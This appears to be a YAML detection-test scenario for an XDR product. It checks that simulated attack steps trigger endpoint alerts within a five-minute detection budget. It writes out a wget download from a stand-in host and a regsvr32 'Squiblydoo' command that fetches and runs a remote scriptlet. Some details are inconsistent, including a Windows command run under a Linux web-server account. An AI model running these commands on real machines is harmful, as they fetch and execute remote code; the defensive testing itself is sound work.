threshold:
  kpi: MTTD
  op: ≤
  value: 300
  unit: seconds
success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected

  XDR BIOC / XQL detections, and the mean time from signal emit to alert

  creation is within the MTTD budget. Each step''s expected_detections row is

  validated against dataset=xdr_data.

  '
moat_tier: LEAD
cgo_anchor:
  image_name: apache2
  primary_username: www-data
external_tools:
- name: Atomic Red Team
  source: https://github.com/redcanaryco/atomic-red-team
  type: script
  install_inline: false
  adapter_ref: TOOL-ATOMIC-RED-TEAM
steps:
- id: step-01
  name: Download Scriptlet
  command: wget -O /tmp/scratch/x.sct http://192.0.2.1/x.sct
  identity: www-data
  mitre_technique: T1105
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Regsvr32 with Remote Scriptlet
    ttp_ref: TTP-2026-0194
    detection_id: bioc-regsvr32-with-remote-scriptlet
- id: step-02
  name: Stub Executable
  command: stub chmod +x /tmp/scratch/x.sct
  identity: www-data
  mitre_technique: T1105
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Regsvr32 with Remote Scriptlet
    ttp_ref: TTP-2026-0194
    detection_id: bioc-regsvr32-with-remote-scriptlet
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Execute Squiblydoo
  command: regsvr32 /s /n /u /i:http://192.0.2.1/x.sct scrobj.dll
  identity: www-data
  mitre_technique: T1218.010
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Regsvr32 with Remote Scriptlet
    ttp_ref: TTP-2026-0194
    detection_id: bioc-regsvr32-with-remote-scriptlet
  causality:
    parent_step: step-02
    pivot: process_lineage
cleanup:
  commands:
  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
